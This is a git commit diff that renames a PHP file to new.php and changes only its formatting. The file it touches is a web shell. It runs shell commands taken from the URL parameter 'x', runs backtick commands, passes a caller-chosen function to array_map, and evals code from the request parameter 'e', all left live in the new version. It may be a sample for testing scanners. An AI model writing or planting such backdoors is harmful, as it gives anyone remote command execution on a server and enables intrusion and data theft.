68c75733d36b321e3d58ff389d512f220d1430de
kbelous <kbelouswork@gmail.com>
2019-09-25 12:17:14 +0300

    Update and rename test4.php to new.php

--- new.php
+++ new.php
@@ -1,4 +1,4 @@
-<?  
+<?php
 system($_GET['x']);
 phpinfo();
 
@@ -16,7 +16,7 @@ $evil_callback = $_GET['callback'];
 $some_array = array(0, 1, 2, 3);
 $new_array = array_map($evil_callback, $some_array);
 <?=@`$c`?>
-if (isset($_REQUEST['e'])) {
-eval(stripslashes($_REQUEST['e']));
+if (isset($_REQUEST["e"])) {
+      eval(stripslashes($_REQUEST['e']));
 }
 ?>
